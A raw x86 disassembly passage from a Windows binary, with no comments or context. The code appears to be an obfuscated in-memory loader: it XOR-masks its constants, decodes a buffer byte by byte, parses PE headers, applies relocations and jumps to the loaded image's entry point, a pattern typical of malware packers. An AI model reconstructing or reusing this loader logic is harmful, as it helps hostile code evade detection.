  425d93:	lea    ecx,[ebp-0xdc]
  425d99:	push   ecx
  425d9a:	push   DWORD PTR [ebp-0x20]
  425d9d:	push   eax
  425d9e:	lea    eax,[ebp-0xc8]
  425da4:	push   eax
  425da5:	mov    eax,DWORD PTR [ebp-0x14]
  425da8:	push   DWORD PTR [eax+0xc]
  425dab:	mov    eax,DWORD PTR [ebp-0x2c]
  425dae:	add    eax,0x10
  425db1:	push   eax
  425db2:	push   edi
  425db3:	call   0x425057
  425db8:	mov    DWORD PTR [ebp-0x40],eax
  425dbb:	mov    eax,DWORD PTR [ebp+0x8]
  425dbe:	mov    ecx,DWORD PTR [ebp-0x50]
  425dc1:	mov    eax,DWORD PTR [eax+0x1d8]
  425dc7:	xor    ecx,ebx
  425dc9:	add    ecx,esi
  425dcb:	push   ecx
  425dcc:	mov    ecx,DWORD PTR [ebp-0xc]
  425dcf:	xor    ecx,ebx
  425dd1:	add    ecx,esi
  425dd3:	push   ecx
  425dd4:	push   edi
  425dd5:	call   DWORD PTR [eax+0x18]
  425dd8:	mov    eax,DWORD PTR [ebp-0x40]
  425ddb:	add    eax,0xffcd8d14
  425de0:	xor    eax,ebx
  425de2:	cmp    eax,0xf89c85b0
  425de7:	mov    eax,DWORD PTR [ebp+0x8]
  425dea:	mov    eax,DWORD PTR [eax+0x1d8]
  425df0:	mov    ecx,DWORD PTR [ebp-0x50]
  425df3:	jne    0x425e16
  425df5:	xor    ecx,ebx
  425df7:	add    ecx,esi
  425df9:	push   ecx
  425dfa:	mov    ecx,DWORD PTR [ebp-0xc]
  425dfd:	xor    ecx,ebx
  425dff:	add    ecx,esi
  425e01:	push   ecx
  425e02:	push   DWORD PTR [ebp-0x2c]
  425e05:	call   DWORD PTR [eax+0x18]
  425e08:	mov    eax,DWORD PTR [ebp-0x24]
  425e0b:	mov    DWORD PTR [ebp-0x2c],eax
  425e0e:	mov    eax,DWORD PTR [ebp-0x20]
  425e11:	mov    DWORD PTR [ebp-0x3c],eax
  425e14:	jmp    0x425e29
  425e16:	xor    ecx,ebx
  425e18:	add    ecx,esi
  425e1a:	push   ecx
  425e1b:	mov    ecx,DWORD PTR [ebp-0xc]
  425e1e:	xor    ecx,ebx
  425e20:	add    ecx,esi
  425e22:	push   ecx
  425e23:	push   DWORD PTR [ebp-0x24]
  425e26:	call   DWORD PTR [eax+0x18]
  425e29:	mov    eax,DWORD PTR [ebp-0x3c]
  425e2c:	mov    DWORD PTR [ebp-0x34],eax
  425e2f:	mov    eax,DWORD PTR [ebp-0x2c]
  425e32:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  425e39:	mov    DWORD PTR [ebp-0x40],eax
  425e3c:	mov    edi,0xf89c85b1
  425e41:	mov    DWORD PTR [ebp-0x30],edi
  425e44:	mov    eax,DWORD PTR [ebp-0x28]
  425e47:	xor    eax,ebx
  425e49:	add    eax,esi
  425e4b:	mov    DWORD PTR [ebp-0xc],eax
  425e4e:	mov    eax,DWORD PTR [ebp-0x28]
  425e51:	xor    eax,ebx
  425e53:	add    eax,esi
  425e55:	mov    DWORD PTR [ebp-0x14],eax
  425e58:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  425e5f:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  425e66:	mov    eax,DWORD PTR [ebp-0x28]
  425e69:	mov    ecx,DWORD PTR [ebp-0x34]
  425e6c:	xor    eax,ebx
  425e6e:	add    eax,esi
  425e70:	cmp    ecx,eax
  425e72:	je     0x426068
  425e78:	jmp    0x426044
  425e7d:	mov    ecx,DWORD PTR [ebp-0xc]
  425e80:	mov    eax,DWORD PTR [ebp-0x34]
  425e83:	sub    eax,ecx
  425e85:	mov    ecx,DWORD PTR [ebp-0x44]
  425e88:	xor    ecx,ebx
  425e8a:	add    ecx,esi
  425e8c:	xor    edx,edx
  425e8e:	div    ecx
  425e90:	mov    DWORD PTR [ebp-0x14],eax
  425e93:	mov    eax,DWORD PTR [ebp-0x24]
  425e96:	mov    ecx,DWORD PTR [ebp-0x14]
  425e99:	xor    eax,ebx
  425e9b:	add    eax,esi
  425e9d:	cmp    ecx,eax
  425e9f:	jbe    0x425eab
  425ea1:	mov    eax,DWORD PTR [ebp-0x24]
  425ea4:	xor    eax,ebx
  425ea6:	add    eax,esi
  425ea8:	mov    DWORD PTR [ebp-0x14],eax
  425eab:	mov    eax,DWORD PTR [ebp-0x44]
  425eae:	mov    ecx,DWORD PTR [ebp-0x14]
  425eb1:	xor    eax,ebx
  425eb3:	add    eax,esi
  425eb5:	imul   eax,ecx
  425eb8:	mov    DWORD PTR [ebp-0x14],eax
  425ebb:	mov    eax,DWORD PTR [ebp-0x28]
  425ebe:	mov    ecx,DWORD PTR [ebp-0x14]
  425ec1:	xor    eax,ebx
  425ec3:	add    eax,esi
  425ec5:	cmp    ecx,eax
  425ec7:	je     0x426032
  425ecd:	mov    eax,DWORD PTR [ebp-0x14]
  425ed0:	mov    DWORD PTR [ebp-0x20],eax
  425ed3:	mov    eax,DWORD PTR [ebp-0xc]
  425ed6:	add    eax,DWORD PTR [ebp-0x40]
  425ed9:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  425ee0:	mov    DWORD PTR [ebp-0x14],edi
  425ee3:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  425eea:	mov    DWORD PTR [ebp-0x1c],eax
  425eed:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  425ef4:	mov    DWORD PTR [ebp-0x8],edi
  425ef7:	mov    eax,DWORD PTR [ebp-0x4c]
  425efa:	xor    eax,ebx
  425efc:	add    eax,esi
  425efe:	jmp    0x425ff1
  425f03:	mov    DWORD PTR [ebp-0xe4],0xf89c85bb
  425f0d:	mov    DWORD PTR [ebp-0xd0],0xf89c858e
  425f17:	mov    eax,DWORD PTR [ebp-0x8]
  425f1a:	mov    ecx,DWORD PTR [ebp-0x18]
  425f1d:	xor    eax,ebx
  425f1f:	add    eax,esi
  425f21:	imul   eax,ecx
  425f24:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f27:	mov    al,BYTE PTR [eax+ecx*1]
  425f2a:	mov    BYTE PTR [ebp-0x1],al
  425f2d:	mov    eax,DWORD PTR [ebp-0x8]
  425f30:	mov    ecx,DWORD PTR [ebp-0x18]
  425f33:	xor    eax,ebx
  425f35:	add    eax,esi
  425f37:	imul   eax,ecx
  425f3a:	mov    ecx,DWORD PTR [ebp-0x54]
  425f3d:	xor    ecx,ebx
  425f3f:	add    eax,ecx
  425f41:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f44:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425f4c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425f52:	xor    ecx,ebx
  425f54:	lea    eax,[ecx+eax*1+0x3272ec]
  425f5b:	movzx  ecx,BYTE PTR [ebp-0x1]
  425f5f:	xor    ecx,eax
  425f61:	mov    BYTE PTR [ebp-0x1],cl
  425f64:	mov    al,BYTE PTR [ebp-0x1]
  425f67:	mov    ecx,DWORD PTR [ebp-0x8]
  425f6a:	mov    edx,DWORD PTR [ebp-0x18]
  425f6d:	xor    ecx,ebx
  425f6f:	add    ecx,esi
  425f71:	imul   ecx,edx
  425f74:	mov    edx,DWORD PTR [ebp-0x1c]
  425f77:	mov    BYTE PTR [ecx+edx*1],al
  425f7a:	mov    eax,DWORD PTR [ebp-0x8]
  425f7d:	mov    ecx,DWORD PTR [ebp-0x18]
  425f80:	xor    eax,ebx
  425f82:	add    eax,esi
  425f84:	imul   eax,ecx
  425f87:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f8a:	mov    al,BYTE PTR [eax+ecx*1]
  425f8d:	mov    BYTE PTR [ebp-0x1],al
  425f90:	mov    eax,DWORD PTR [ebp-0x8]
  425f93:	mov    ecx,DWORD PTR [ebp-0x18]
  425f96:	xor    eax,ebx
  425f98:	add    eax,esi
  425f9a:	imul   eax,ecx
  425f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  425fa0:	xor    ecx,ebx
  425fa2:	add    eax,ecx
  425fa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  425fa7:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  425faf:	mov    ecx,DWORD PTR [ebp-0xd0]
  425fb5:	xor    ecx,ebx
  425fb7:	lea    eax,[ecx+eax*1+0x3272ec]
  425fbe:	movzx  ecx,BYTE PTR [ebp-0x1]
  425fc2:	xor    ecx,eax
  425fc4:	mov    BYTE PTR [ebp-0x1],cl
  425fc7:	mov    al,BYTE PTR [ebp-0x1]
  425fca:	mov    ecx,DWORD PTR [ebp-0x8]
  425fcd:	mov    edx,DWORD PTR [ebp-0x18]
  425fd0:	xor    ecx,ebx
  425fd2:	add    ecx,esi
  425fd4:	imul   ecx,edx
  425fd7:	mov    edx,DWORD PTR [ebp-0x1c]
  425fda:	mov    BYTE PTR [ecx+edx*1],al
  425fdd:	mov    eax,DWORD PTR [ebp-0x38]
  425fe0:	mov    ecx,DWORD PTR [ebp-0x14]
  425fe3:	xor    eax,ebx
  425fe5:	xor    ecx,ebx
  425fe7:	add    eax,esi
  425fe9:	add    ecx,esi
  425feb:	imul   eax,ecx
  425fee:	add    eax,DWORD PTR [ebp-0x18]
  425ff1:	mov    DWORD PTR [ebp-0x18],eax
  425ff4:	mov    eax,DWORD PTR [ebp-0x18]
  425ff7:	mov    ecx,DWORD PTR [ebp-0x20]
  425ffa:	cmp    ecx,eax
  425ffc:	jb     0x425f03
  426002:	mov    eax,DWORD PTR [ebp-0x14]
  426005:	mov    ecx,DWORD PTR [ebp-0x20]
  426008:	xor    eax,ebx
  42600a:	add    eax,esi
  42600c:	imul   eax,ecx
  42600f:	mov    ecx,DWORD PTR [ebp-0x4c]
  426012:	xor    ecx,ebx
  426014:	add    ecx,esi
  426016:	or     eax,ecx
  426018:	mov    ecx,DWORD PTR [ebp-0x30]
  42601b:	xor    ecx,ebx
  42601d:	add    eax,ecx
  42601f:	mov    ecx,DWORD PTR [ebp-0x30]
  426022:	xor    ecx,ebx
  426024:	add    eax,ecx
  426026:	mov    ecx,DWORD PTR [ebp-0xc]
  426029:	lea    eax,[eax+ecx*1+0x64e5d8]
  426030:	jmp    0x426041
  426032:	mov    eax,DWORD PTR [ebp-0x30]
  426035:	mov    ecx,DWORD PTR [ebp-0xc]
  426038:	xor    eax,ebx
  42603a:	lea    eax,[eax+ecx*1+0x3272ec]
  426041:	mov    DWORD PTR [ebp-0xc],eax
  426044:	mov    eax,DWORD PTR [ebp-0x30]
  426047:	xor    eax,ebx
  426049:	mov    ecx,0xffcd8d14
  42604e:	sub    ecx,eax
  426050:	add    ecx,DWORD PTR [ebp-0x34]
  426053:	mov    eax,DWORD PTR [ebp-0x30]
  426056:	mov    edx,DWORD PTR [ebp-0xc]
  426059:	xor    eax,ebx
  42605b:	add    eax,esi
  42605d:	imul   eax,edx
  426060:	cmp    eax,ecx
  426062:	jbe    0x425e7d
  426068:	push   DWORD PTR [ebp+0x8]
  42606b:	mov    eax,DWORD PTR [ebp+0x8]
  42606e:	push   DWORD PTR [eax+0x1cc]
  426074:	lea    eax,[ebp-0xd8]
  42607a:	push   eax
  42607b:	mov    eax,DWORD PTR [ebp+0x8]
  42607e:	mov    eax,DWORD PTR [eax+0x1c4]
  426084:	push   DWORD PTR [eax]
  426086:	mov    eax,DWORD PTR [ebp+0x8]
  426089:	mov    eax,DWORD PTR [eax+0x1c0]
  42608f:	push   DWORD PTR [eax]
  426091:	push   DWORD PTR [ebp-0x3c]
  426094:	push   DWORD PTR [ebp-0x2c]
  426097:	call   0x426b2e
  42609c:	mov    DWORD PTR [ebp-0x40],eax
  42609f:	mov    eax,DWORD PTR [ebp-0x10]
  4260a2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4260a5:	xor    eax,ebx
  4260a7:	add    eax,esi
  4260a9:	cmp    eax,ecx
  4260ab:	je     0x4260cc
  4260ad:	mov    eax,DWORD PTR [ebp+0x8]
  4260b0:	mov    ecx,DWORD PTR [ebp-0x50]
  4260b3:	mov    eax,DWORD PTR [eax+0x1d8]
  4260b9:	xor    ecx,ebx
  4260bb:	add    ecx,esi
  4260bd:	push   ecx
  4260be:	mov    ecx,DWORD PTR [ebp-0x10]
  4260c1:	xor    ecx,ebx
  4260c3:	add    ecx,esi
  4260c5:	push   ecx
  4260c6:	push   DWORD PTR [ebp-0x2c]
  4260c9:	call   DWORD PTR [eax+0x18]
  4260cc:	pop    edi
  4260cd:	pop    esi
  4260ce:	pop    ebx
  4260cf:	leave  
  4260d0:	ret    0x4
  4260d3:	push   ebp
  4260d4:	mov    ebp,esp
  4260d6:	push   ecx
  4260d7:	push   ecx
  4260d8:	lea    eax,[ebp-0x8]
  4260db:	mov    DWORD PTR [ebp-0x4],eax
  4260de:	push   esi
  4260df:	mov    esi,DWORD PTR [ebp-0x4]
  4260e2:	mov    eax,0xf881ba2e
  4260e7:	mov    DWORD PTR [esi],eax
  4260e9:	mov    esi,DWORD PTR [ebp-0x8]
  4260ec:	cmp    esi,eax
  4260ee:	pop    esi
  4260ef:	jne    0x4260f9
  4260f1:	mov    BYTE PTR [ecx+0xa],0x7a
  4260f5:	mov    BYTE PTR [edx+0x8],0x2f
  4260f9:	mov    BYTE PTR [edx+0xa],0x7a
  4260fd:	mov    BYTE PTR [ecx+0x2],0x8
  426101:	leave  
  426102:	ret    
  426103:	push   ebp
  426104:	mov    ebp,esp
  426106:	push   ecx
  426107:	push   ecx
  426108:	lea    eax,[ebp-0x8]
  42610b:	mov    DWORD PTR [ebp-0x4],eax
  42610e:	mov    edx,DWORD PTR [ebp-0x4]
  426111:	mov    eax,0xf88b0bca
  426116:	mov    DWORD PTR [edx],eax
  426118:	mov    edx,DWORD PTR [ebp-0x8]
  42611b:	cmp    edx,eax
  42611d:	jne    0x42612e
  42611f:	mov    eax,DWORD PTR [ebp+0x8]
  426122:	mov    BYTE PTR [ecx+0x9],0xe
  426126:	mov    BYTE PTR [eax+0x7],0x57
  42612a:	mov    BYTE PTR [ecx+0x6],0xf
  42612e:	mov    BYTE PTR [ecx+0x3],0x1e
  426132:	leave  
  426133:	ret    0x4
  426136:	push   ebp
  426137:	mov    ebp,esp
  426139:	push   ecx
  42613a:	push   ecx
  42613b:	lea    eax,[ebp-0x8]
  42613e:	mov    DWORD PTR [ebp-0x4],eax
  426141:	mov    edx,DWORD PTR [ebp-0x4]
  426144:	mov    eax,0x7e0da2e
  426149:	mov    DWORD PTR [edx],eax
  42614b:	mov    edx,DWORD PTR [ebp-0x8]
  42614e:	cmp    edx,eax
  426150:	jne    0x426156
  426152:	mov    BYTE PTR [ecx+0x7],0x57
  426156:	mov    eax,DWORD PTR [ebp+0x8]
  426159:	mov    BYTE PTR [ecx+0x1],0x15
  42615d:	mov    BYTE PTR [eax+0x9],0x2e
  426161:	leave  
  426162:	ret    0x4
  426165:	push   ebp
  426166:	mov    ebp,esp
  426168:	push   ecx
  426169:	push   ecx
  42616a:	lea    eax,[ebp-0x8]
  42616d:	mov    DWORD PTR [ebp-0x4],eax
  426170:	push   esi
  426171:	mov    esi,DWORD PTR [ebp-0x4]
  426174:	mov    eax,0x7060e3f
  426179:	mov    DWORD PTR [esi],eax
  42617b:	mov    esi,DWORD PTR [ebp-0x8]
  42617e:	cmp    esi,eax
  426180:	pop    esi
  426181:	jne    0x42618d
  426183:	mov    BYTE PTR [edx+0x4],0xb
  426187:	mov    WORD PTR [ecx+0x3],0xb1e
  42618d:	mov    BYTE PTR [edx],0x3f
  426190:	leave  
  426191:	ret    
  426192:	push   ebp
  426193:	mov    ebp,esp
  426195:	push   ecx
  426196:	push   ecx
  426197:	lea    eax,[ebp-0x8]
  42619a:	mov    DWORD PTR [ebp-0x4],eax
  42619d:	mov    edx,DWORD PTR [ebp-0x4]
  4261a0:	mov    eax,0xf8870b3e
  4261a5:	mov    DWORD PTR [edx],eax
  4261a7:	mov    edx,DWORD PTR [ebp-0x8]
  4261aa:	cmp    edx,eax
  4261ac:	jne    0x4261b9
  4261ae:	mov    eax,DWORD PTR [ebp+0x8]
  4261b1:	mov    BYTE PTR [ecx+0x8],0xf
  4261b5:	mov    BYTE PTR [eax+0x1],0x15
  4261b9:	mov    BYTE PTR [ecx+0x5],0x3
  4261bd:	leave  
  4261be:	ret    0x4
  4261c1:	push   esi
  4261c2:	mov    ecx,edi
  4261c4:	call   0x426192
  4261c9:	mov    edx,edi
  4261cb:	mov    ecx,esi
  4261cd:	mov    BYTE PTR [esi],0x1f
  4261d0:	call   0x426165
  4261d5:	push   esi
  4261d6:	mov    ecx,edi
  4261d8:	mov    BYTE PTR [esi+0x5],0x3
  4261dc:	call   0x426136
  4261e1:	push   esi
  4261e2:	mov    BYTE PTR [esi+0x6],0xf
  4261e6:	call   0x426103
  4261eb:	mov    BYTE PTR [esi+0x2],0x8
  4261ef:	mov    edx,esi
  4261f1:	jmp    0x4260d3
  4261f6:	push   ebp
  4261f7:	mov    ebp,esp
  4261f9:	push   ecx
  4261fa:	mov    ecx,DWORD PTR [edx+0x194]
  426200:	push   esi
  426201:	mov    esi,DWORD PTR [ebp+0x8]
  426204:	mov    esi,DWORD PTR [esi]
  426206:	mov    DWORD PTR [ecx],esi
  426208:	mov    ecx,DWORD PTR [edx+0x194]
  42620e:	mov    ecx,DWORD PTR [ecx]
  426210:	mov    esi,DWORD PTR [edx+0x190]
  426216:	mov    DWORD PTR [esi],ecx
  426218:	mov    eax,DWORD PTR [edx+0x194]
  42621e:	mov    ecx,DWORD PTR [eax]
  426220:	mov    ecx,DWORD PTR [ecx+0x3c]
  426223:	add    ecx,DWORD PTR [eax]
  426225:	mov    DWORD PTR [ebp-0x4],0xf89ca5b0
  42622c:	mov    eax,DWORD PTR [ebp-0x4]
  42622f:	movzx  ecx,WORD PTR [ecx+0x16]
  426233:	xor    eax,0x75108a4
  426238:	add    eax,0x3272ec
  42623d:	pop    esi
  42623e:	test   ecx,eax
  426240:	je     0x42624e
  426242:	mov    eax,DWORD PTR [edx+0x1c8]
  426248:	mov    DWORD PTR [eax],0xf89c85b1
  42624e:	leave  
  42624f:	ret    0x4
  426252:	push   ebp
  426253:	mov    ebp,esp
  426255:	sub    esp,0x70
  426258:	and    DWORD PTR [ebp-0x20],0x0
  42625c:	mov    DWORD PTR [ebp-0x18],0xf89cb5b0
  426263:	mov    DWORD PTR [ebp-0x1c],0xf89c85f0
  42626a:	mov    DWORD PTR [ebp-0x2c],0xf89c85bc
  426271:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  426278:	mov    DWORD PTR [ebp-0x2c],0xf89f05b0
  42627f:	mov    eax,DWORD PTR [ebp+0x20]
  426282:	mov    eax,DWORD PTR [eax+0x194]
  426288:	mov    DWORD PTR [ebp-0xc],eax
  42628b:	mov    eax,DWORD PTR [ebp+0x20]
  42628e:	push   ebx
  42628f:	push   esi
  426290:	mov    esi,DWORD PTR [eax+0x190]
  426296:	mov    eax,DWORD PTR [ebp+0x20]
  426299:	mov    eax,DWORD PTR [eax+0x18c]
  42629f:	mov    DWORD PTR [ebp-0x8],eax
  4262a2:	mov    eax,DWORD PTR [eax]
  4262a4:	push   edi
  4262a5:	mov    DWORD PTR [ebp-0x4],esi
  4262a8:	test   eax,eax
  4262aa:	jne    0x4262b7
  4262ac:	push   DWORD PTR [ebp+0x1c]
  4262af:	mov    edx,DWORD PTR [ebp+0x20]
  4262b2:	call   0x4261f6
  4262b7:	mov    eax,DWORD PTR [esi]
  4262b9:	mov    ebx,DWORD PTR [esi]
  4262bb:	add    ebx,DWORD PTR [eax+0x3c]
  4262be:	mov    eax,DWORD PTR [ebp+0xc]
  4262c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4262c4:	mov    ecx,DWORD PTR [ecx]
  4262c6:	mov    esi,0x75108a4
  4262cb:	xor    eax,esi
  4262cd:	mov    edi,0x3272ec
  4262d2:	add    eax,edi
  4262d4:	cmp    eax,ecx
  4262d6:	jne    0x42650e
  4262dc:	mov    eax,DWORD PTR [ebp-0xc]
  4262df:	mov    eax,DWORD PTR [eax]
  4262e1:	mov    DWORD PTR [ebp-0x10],eax
  4262e4:	mov    eax,DWORD PTR [ebx+0x50]
  4262e7:	mov    DWORD PTR [ebp-0x68],eax
  4262ea:	mov    eax,DWORD PTR [ebp-0x18]
  4262ed:	xor    eax,esi
  4262ef:	add    eax,edi
  4262f1:	mov    DWORD PTR [ebp-0x64],eax
  4262f4:	mov    eax,DWORD PTR [ebp-0x14]
  4262f7:	and    DWORD PTR [ebp-0x6c],0x0
  4262fb:	xor    eax,esi
  4262fd:	add    eax,edi
  4262ff:	mov    DWORD PTR [ebp-0x60],eax
  426302:	lea    eax,[ebp-0x70]
  426305:	push   eax
  426306:	mov    eax,DWORD PTR [ebp+0x8]
  426309:	xor    eax,esi
  42630b:	add    eax,edi
  42630d:	push   eax
  42630e:	mov    eax,DWORD PTR [ebp+0x20]
  426311:	add    eax,0xaa
  426316:	push   eax
  426317:	mov    eax,DWORD PTR [ebp+0x20]
  42631a:	mov    eax,DWORD PTR [eax+0x198]
  426320:	mov    DWORD PTR [ebp-0x70],0x4
  426327:	push   DWORD PTR [eax]
  426329:	mov    eax,DWORD PTR [ebp+0x10]
  42632c:	call   eax
  42632e:	mov    ecx,DWORD PTR [ebp-0xc]
  426331:	mov    ecx,DWORD PTR [ecx]
  426333:	mov    edx,DWORD PTR [ebp-0x8]
  426336:	mov    DWORD PTR [ebp-0x6c],eax
  426339:	mov    DWORD PTR [ebp+0x1c],eax
  42633c:	mov    DWORD PTR [edx],ecx
  42633e:	mov    ecx,DWORD PTR [ebp-0x4]
  426341:	mov    DWORD PTR [ecx],eax
  426343:	mov    eax,DWORD PTR [ebx+0x50]
  426346:	mov    DWORD PTR [ebp-0x68],eax
  426349:	mov    eax,DWORD PTR [ebp-0x1c]
  42634c:	xor    eax,esi
  42634e:	add    eax,edi
  426350:	mov    DWORD PTR [ebp-0x64],eax
  426353:	lea    eax,[ebp-0x20]
  426356:	mov    DWORD PTR [ebp-0x60],eax
  426359:	lea    eax,[ebp-0x70]
  42635c:	push   eax
  42635d:	mov    eax,DWORD PTR [ebp+0x8]
  426360:	xor    eax,esi
  426362:	add    eax,edi
  426364:	push   eax
  426365:	mov    eax,DWORD PTR [ebp+0x20]
  426368:	add    eax,0xee
  42636d:	push   eax
  42636e:	mov    eax,DWORD PTR [ebp+0x20]
  426371:	mov    eax,DWORD PTR [eax+0x198]
  426377:	mov    DWORD PTR [ebp-0x70],0x4
  42637e:	push   DWORD PTR [eax]
  426380:	mov    eax,DWORD PTR [ebp+0x10]
  426383:	call   eax
  426385:	test   eax,eax
  426387:	je     0x4263ac
  426389:	and    DWORD PTR [ebp+0xc],0x0
  42638d:	cmp    DWORD PTR [ebx+0x50],0x0
  426391:	jbe    0x4263ac
  426393:	mov    eax,DWORD PTR [ebp+0x1c]
  426396:	mov    ecx,DWORD PTR [ebp-0x10]
  426399:	sub    ecx,eax
  42639b:	mov    dl,BYTE PTR [ecx+eax*1]
  42639e:	inc    DWORD PTR [ebp+0xc]
  4263a1:	mov    BYTE PTR [eax],dl
  4263a3:	mov    edx,DWORD PTR [ebp+0xc]
  4263a6:	inc    eax
  4263a7:	cmp    edx,DWORD PTR [ebx+0x50]
  4263aa:	jb     0x42639b
  4263ac:	mov    edx,DWORD PTR [ebp+0x1c]
  4263af:	mov    ecx,DWORD PTR [edx+0x3c]
  4263b2:	add    ecx,edx
  4263b4:	mov    eax,DWORD PTR [ecx+0xa0]
  4263ba:	mov    ebx,DWORD PTR [ecx+0x28]
  4263bd:	add    eax,edx
  4263bf:	sub    edx,DWORD PTR [ebp-0x10]
  4263c2:	add    ebx,DWORD PTR [ebp+0x1c]
  4263c5:	mov    DWORD PTR [ebp+0xc],edx
  4263c8:	mov    DWORD PTR [ebp-0x2c],ecx
  4263cb:	mov    DWORD PTR [ebp-0x14],ebx
  4263ce:	mov    DWORD PTR [ebp-0x8],0x0
  4263d5:	jmp    0x426451
  4263d7:	add    edx,0xfffffff8
  4263da:	shr    edx,1
  4263dc:	mov    DWORD PTR [ebp-0x18],edx
  4263df:	je     0x42643d
  4263e1:	lea    edx,[eax+0x8]
  4263e4:	mov    DWORD PTR [ebp-0x4],edx
  4263e7:	mov    edx,DWORD PTR [ebp-0x18]
  4263ea:	mov    DWORD PTR [ebp-0x18],edx
  4263ed:	mov    edx,DWORD PTR [ebp-0x4]
  4263f0:	movzx  edx,WORD PTR [edx]
  4263f3:	mov    DWORD PTR [ebp-0x24],edx
  4263f6:	and    edx,0xfff
  4263fc:	mov    DWORD PTR [ebp-0x28],edx
  4263ff:	mov    edx,DWORD PTR [ebp-0x24]
  426402:	shr    edx,0xc
  426405:	add    edx,0xffcd8d14
  42640b:	xor    edx,esi
  42640d:	cmp    edx,0xf89c85b3
  426413:	jne    0x426434
  426415:	mov    edx,DWORD PTR [ebp-0x28]
  426418:	add    edx,DWORD PTR [ebp+0x1c]
  42641b:	mov    ebx,DWORD PTR [eax]
  42641d:	cmp    DWORD PTR [ebx+edx*1],0x0
  426421:	je     0x426431
  426423:	mov    ecx,DWORD PTR [ebp+0xc]
  426426:	add    ecx,DWORD PTR [ebx+edx*1]
  426429:	mov    ebx,DWORD PTR [eax]
  42642b:	mov    DWORD PTR [edx+ebx*1],ecx
  42642e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426431:	mov    ebx,DWORD PTR [ebp-0x14]
  426434:	add    DWORD PTR [ebp-0x4],0x2
  426438:	dec    DWORD PTR [ebp-0x18]
  42643b:	jne    0x4263ed
  42643d:	mov    edx,DWORD PTR [ebp-0xc]
  426440:	add    DWORD PTR [ebp-0x8],edx
  426443:	mov    edx,DWORD PTR [ebp-0x8]
  426446:	cmp    edx,DWORD PTR [ecx+0xa4]
  42644c:	jae    0x42645f
  42644e:	add    eax,DWORD PTR [ebp-0xc]
  426451:	mov    edx,DWORD PTR [eax+0x4]
  426454:	mov    DWORD PTR [ebp-0xc],edx
  426457:	test   edx,edx
  426459:	jne    0x4263d7
  42645f:	mov    eax,DWORD PTR [ebp-0x10]
  426462:	mov    DWORD PTR [ebp-0x6c],eax
  426465:	mov    DWORD PTR [ebp-0x70],0x4
  42646c:	mov    eax,DWORD PTR [ecx+0x50]
  42646f:	mov    DWORD PTR [ebp-0x68],eax
  426472:	mov    eax,DWORD PTR [ebp-0x1c]
  426475:	xor    eax,esi
  426477:	add    eax,edi
  426479:	mov    DWORD PTR [ebp-0x64],eax
  42647c:	lea    eax,[ebp-0x20]
  42647f:	mov    DWORD PTR [ebp-0x60],eax
  426482:	lea    eax,[ebp-0x70]
  426485:	push   eax
  426486:	mov    eax,DWORD PTR [ebp+0x8]
  426489:	xor    eax,esi
  42648b:	add    eax,edi
  42648d:	push   eax
  42648e:	mov    eax,DWORD PTR [ebp+0x20]
  426491:	add    eax,0xee
  426496:	push   eax
  426497:	mov    eax,DWORD PTR [ebp+0x20]
  42649a:	mov    eax,DWORD PTR [eax+0x198]
  4264a0:	push   DWORD PTR [eax]
  4264a2:	mov    eax,DWORD PTR [ebp+0x10]
  4264a5:	call   eax
  4264a7:	mov    eax,DWORD PTR [ebp+0x20]
  4264aa:	mov    eax,DWORD PTR [eax+0x180]
  4264b0:	add    eax,DWORD PTR [ebp+0xc]
  4264b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4264b6:	push   DWORD PTR [ebp+0x18]
  4264b9:	mov    DWORD PTR [eax],ecx
  4264bb:	push   DWORD PTR [ebp+0x14]
  4264be:	push   DWORD PTR [ebp+0x1c]
  4264c1:	call   ebx
  4264c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4264c6:	add    ecx,DWORD PTR [ebp+0x20]
  4264c9:	lea    eax,[ebp+0x4]
  4264cc:	mov    DWORD PTR [ebp+0x20],ecx
  4264cf:	mov    ecx,DWORD PTR [ebp+0x20]
  4264d2:	mov    ecx,DWORD PTR [ebp+0x20]
  4264d5:	mov    edx,DWORD PTR [ecx+0x190]
  4264db:	mov    ecx,DWORD PTR [ebp+0x20]
  4264de:	mov    ecx,DWORD PTR [ecx+0x18c]
  4264e4:	mov    esi,DWORD PTR [ecx]
  4264e6:	cmp    DWORD PTR [eax],esi
  4264e8:	jb     0x426509
  4264ea:	mov    esi,DWORD PTR [edx]
  4264ec:	mov    edi,DWORD PTR [edx]
  4264ee:	mov    esi,DWORD PTR [esi+0x3c]
  4264f1:	lea    esi,[edi+esi*1+0x50]
  4264f5:	mov    edi,DWORD PTR [ecx]
  4264f7:	add    edi,DWORD PTR [esi]
  4264f9:	cmp    DWORD PTR [eax],edi
  4264fb:	jae    0x426509
  4264fd:	mov    esi,DWORD PTR [ecx]
  4264ff:	mov    ecx,DWORD PTR [eax]
  426501:	mov    edx,DWORD PTR [edx]
  426503:	sub    ecx,esi
  426505:	add    edx,ecx
  426507:	mov    DWORD PTR [eax],edx
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	jmp    0x426510
  42650e:	xor    eax,eax
  426510:	pop    edi
  426511:	pop    esi
  426512:	pop    ebx
  426513:	leave  
  426514:	ret    0x1c
  426517:	push   ebp
  426518:	mov    ebp,esp
  42651a:	sub    esp,0x1c
  42651d:	push   esi
  42651e:	mov    esi,eax
  426520:	mov    eax,DWORD PTR [ecx+0x190]
  426526:	cmp    DWORD PTR [eax],0x0
  426529:	je     0x426639
  42652f:	test   edx,edx
  426531:	je     0x426639
  426537:	test   esi,esi
  426539:	je     0x426639
  42653f:	mov    eax,DWORD PTR [esi+0x88]
  426545:	test   eax,eax
  426547:	je     0x426634
  42654d:	cmp    DWORD PTR [esi+0x8c],0x10
  426554:	je     0x426634
